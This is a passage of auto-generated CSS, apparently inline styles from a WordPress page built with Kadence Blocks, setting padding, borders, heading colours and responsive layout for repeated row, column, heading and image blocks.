mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_64ac80-bd img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_64ac80-bd[data-kb-block="kb-adv-heading76_64ac80-bd"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_64ac80-bd, .wp-block-kadence-advancedheading.kt-adv-heading76_64ac80-bd[data-kb-block="kb-adv-heading76_64ac80-bd"]{font-size:22px;}}.kb-row-layout-id76_6cc435-fd > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_6cc435-fd > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_cb3fc9-51 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_cb3fc9-51 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_cb3fc9-51 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_cb3fc9-51 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_cb3fc9-51 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_cb3fc9-51, .kt-inside-inner-col > .kadence-column76_cb3fc9-51:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_cb3fc9-51 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_cb3fc9-51 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_184fae-f5 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_184fae-f5 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_184fae-f5 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_184fae-f5 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_184fae-f5 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_184fae-f5, .kt-inside-inner-col > .kadence-column76_184fae-f5:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_184fae-f5 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_184fae-f5 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_edb21f-2a, .wp-block-kadence-advancedheading.kt-adv-heading76_edb21f-2a[data-kb-block="kb-adv-heading76_edb21f-2a"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_edb21f-2a mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_edb21f-2a[data-kb-block="kb-adv-heading76_edb21f-2a"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_edb21f-2a img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_edb21f-2a[data-kb-block="kb-adv-heading76_edb21f-2a"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_edb21f-2a, .wp-block-kadence-advancedheading.kt-adv-heading76_edb21f-2a[data-kb-block="kb-adv-heading76_edb21f-2a"]{font-size:22px;}}.kb-row-layout-id76_3ec0d2-a1 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_3ec0d2-a1 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_417f78-3d > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_417f78-3d > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_417f78-3d > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_417f78-3d > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_417f78-3d > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_417f78-3d, .kt-inside-inner-col > .kadence-column76_417f78-3d:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_417f78-3d > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_417f78-3d > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_7cb9a4-4b > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_7cb9a4-4b > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_7cb9a4-4b > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_7cb9a4-4b > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_7cb9a4-4b > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_7cb9a4-4b, .kt-inside-inner-col > .kadence-column76_7cb9a4-4b:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_7cb9a4-4b > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_7cb9a4-4b > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_1501d3-8d, .wp-block-kadence-advancedheading.kt-adv-heading76_1501d3-8d[data-kb-block="kb-adv-heading76_1501d3-8d"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_1501d3-8d mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_1501d3-8d[data-kb-block="kb-adv-heading76_1501d3-8d"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_1501d3-8d img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_1501d3-8d[data-kb-block="kb-adv-heading76_1501d3-8d"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_1501d3-8d, .wp-block-kadence-advancedheading.kt-adv-heading76_1501d3-8d[data-kb-block="kb-adv-heading76_1501d3-8d"]{font-size:22px;}}.wp-block-kadence-image.kb-image76_a9f45e-ca:not(.kb-specificity-added):not(.kb-extra-specificity-added){margin-bottom:30px;}.kb-image76_a9f45e-ca .kb-image-has-overlay:after{opacity:0.3;}.kb-image76_a9f45e-ca img.kb-img, .kb-image76_a9f45e-ca .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);box-shadow:2px 2px 14px 0px #244893;}@media all and (max-width: 1024px){.kb-image76_a9f45e-ca img.kb-img, .kb-image76_a9f45e-ca .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}@media all and (max-width: 767px){.kb-image76_a9f45e-ca.kb-image-is-ratio-size, .kb-image76_a9f45e-ca .kb-image-is-ratio-size{max-width:150px;width:100%;}.kb-image76_a9f45e-ca figure{max-width:150px;}.kb-image76_a9f45e-ca img.kb-img, .kb-image76_a9f45e-ca .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}.kb-row-layout-id76_332204-91 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_332204-91 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_c55577-d1 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_c55577-d1 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_c55577-d1 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_c55577-d1 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_c55577-d1 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_c55577-d1, .kt-inside-inner-col > .kadence-column76_c55577-d1:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_c55577-d1 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_c55577-d1 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_5c1fd7-f8 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_5c1fd7-f8 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_5c1fd7-f8 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_5c1fd7-f8 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_5c1fd7-f8 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_5c1fd7-f8, .kt-inside-inner-col > .kadence-column76_5c1fd7-f8:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_5c1fd7-f8 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_5c1fd7-f8 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_d04f74-14, .wp-block-kadence-advancedheading.kt-adv-heading76_d04f74-14[data-kb-block="kb-adv-heading76_d04f74-14"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_d04f74-14 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_d04f74-14[data-kb-block="kb-adv-heading76_d04f74-14"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_d04f74-14 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_d04f74-14[data-kb-block="kb-adv-heading76_d04f74-14"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_d04f74-14, .wp-block-kadence-advancedheading.kt-adv-heading76_d04f74-14[data-kb-block="kb-adv-heading76_d04f74-14"]{font-size:22px;}}.kb-row-layout-id76_35ff5d-a4 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_35ff5d-a4 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_4b4ad0-97 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_4b4ad0-97 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_4b4ad0-97 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_4b4ad0-97 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_4b4ad0-97 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_4b4ad0-97, .kt-inside-inner-col > .kadence-column76_4b4ad0-97:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_4b4ad0-97 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_4b4ad0-97 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_7e066f-69 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_7e066f-69 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_7e066f-69 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_7e066f-69 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_7e066f-69 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_7e066f-69, .kt-inside-inner-col > .kadence-column76_7e066f-69:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_7e066f-69 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_7e066f-69 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_325ab4-c4, .wp-block-kadence-advancedheading.kt-adv-heading76_325ab4-c4[data-kb-block="kb-adv-heading76_325ab4-c4"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_325ab4-c4 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_325ab4-c4[data-kb-block="kb-adv-heading76_325ab4-c4"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_325ab4-c4 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_325ab4-c4[data-kb-block="kb-adv-heading76_325ab4-c4"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_325ab4-c4, .wp-block-kadence-advancedheading.kt-adv-heading76_325ab4-c4[data-kb-block="kb-adv-heading76_325ab4-c4"]{font-size:22px;}}.kb-row-layout-id76_ebb23f-db > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_ebb23f-db > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_4d719f-b1 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_4d719f-b1 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_4d719f-b1 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_4d719f-b1 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_4d719f-b1 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_4d719f-b1, .kt-inside-inner-col > .kadence-column76_4d719f-b1:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_4d719f-b1 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_4d719f-b1 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_67adec-be > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_67adec-be > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_67adec-be > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_67adec-be > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_67adec-be > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_67adec-be, .kt-inside-inner-col > .kadence-column76_67adec-be:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_67adec-be > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_67adec-be > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_7c5022-a5, .wp-block-kadence-advancedheading.kt-adv-heading76_7c5022-a5[data-kb-block="kb-adv-heading76_7c5022-a5"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_7c5022-a5 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_7c5022-a5[data-kb-block="kb-adv-heading76_7c5022-a5"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_7c5022-a5 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_7c5022-a5[data-kb-block="kb-adv-heading76_7c5022-a5"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_7c5022-a5, .wp-block-kadence-advancedheading.kt-adv-heading76_7c5022-a5[data-kb-block="kb-adv-heading76_7c5022-a5"]{font-size:22px;}}.wp-block-kadence-image.kb-image76_81bde4-00:not(.kb-specificity-added):not(.kb-extra-specificity-added){margin-bottom:30px;}.kb-image76_81bde4-00 .kb-image-has-overlay:after{opacity:0.3;}.kb-image76_81bde4-00 img.kb-img, .kb-image76_81bde4-00 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);box-shadow:2px 2px 14px 0px #244893;}@media all and (max-width: 1024px){.kb-image76_81bde4-00 img.kb-img, .kb-image76_81bde4-00 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}@media all and (max-width: 767px){.kb-image76_81bde4-00.kb-image-is-ratio-size, .kb-image76_81bde4-00 .kb-image-is-ratio-size{max-width:150px;width:100%;}.kb-image76_81bde4-00 figure{max-width:150px;}.kb-image76_81bde4-00 img.kb-img, .kb-image76_81bde4-00 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}.kb-row-layout-id76_67070b-58 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_67070b-58 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_5e242f-e5 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_5e242f-e5 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_5e242f-e5 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_5e242f-e5 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_5e242f-e5 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_5e242f-e5, .kt-inside-inner-col > .kadence-column76_5e242f-e5:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_5e242f-e5 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_5e242f-e5 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_b3ed50-9d > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_b3ed50-9d > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_b3ed50-9d > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_b3ed50-9d > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_b3ed50-9d > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_b3ed50-9d, .kt-inside-inner-col > .kadence-column76_b3ed50-9d:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_b3ed50-9d > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_b3ed50-9d > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_ea6946-7b, .wp-block-kadence-advancedheading.kt-adv-heading76_ea6946-7b[data-kb-block="kb-adv-heading76_ea6946-7b"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_ea6946-7b mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_ea6946-7b[data-kb-block="kb-adv-heading76_ea6946-7b"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_ea6946-7b img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_ea6946-7b[data-kb-block="kb-adv-heading76_ea6946-7b"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_ea6946-7b, .wp-block-kadence-advancedheading.kt-adv-heading76_ea6946-7b[data-kb-block="kb-adv-heading76_ea6946-7b"]{font-size:22px;}}.kb-row-layout-id76_d29ee7-e3 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_d29ee7-e3 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_cbec7d-0a > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_cbec7d-0a > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_cbec7d-0a > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_cbec7d-0a > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_cbec7d-0a > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_cbec7d-0a, .kt-inside-inner-col > .kadence-column76_cbec7d-0a:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_cbec7d-0a > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_cbec7d-0a > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_32d0ac-8d > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_32d0ac-8d > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_32d0ac-8d > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_32d0ac-8d > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_32d0ac-8d > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_32d0ac-8d, .kt-inside-inner-col > .kadence-column76_32d0ac-8d:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_32d0ac-8d > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_32d0ac-8d > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_de4427-33, .wp-block-kadence-advancedheading.kt-adv-heading76_de4427-33[data-kb-block="kb-adv-heading76_de4427-33"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_de4427-33 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_de4427-33[data-kb-block="kb-adv-heading76_de4427-33"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_de4427-33 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_de4427-33[data-kb-block="kb-adv-heading76_de4427-33"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_de4427-33, .wp-block-kadence-advancedheading.kt-adv-heading76_de4427-33[data-kb-block="kb-adv-heading76_de4427-33"]{font-size:22px;}}.kb-row-layout-id76_8660b6-13 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_8660b6-13 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_216da9-41 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_216da9-41 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_216da9-41 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_216da9-41 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_216da9-41 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_216da9-41, .kt-inside-inner-col > .kadence-column76_216da9-41:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_216da9-41 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_216da9-41 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_a648bf-58 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_a648bf-58 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_a648bf-58 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_a648bf-58 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_a648bf-58 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_a648bf-58, .kt-inside-inner-col > .kadence-column76_a648bf-58:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_a648bf-58 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_a648bf-58 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_d0c57c-42, .wp-block-kadence-advancedheading.kt-adv-heading76_d0c57c-42[data-kb-block="kb-adv-heading76_d0c57c-42"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_d0c57c-42 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_d0c57c-42[data-kb-block="kb-adv-heading76_d0c57c-42"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_d0c57c-42 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_d0c57c-42[data-kb-block="kb-adv-heading76_d0c57c-42"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_d0c57c-42, 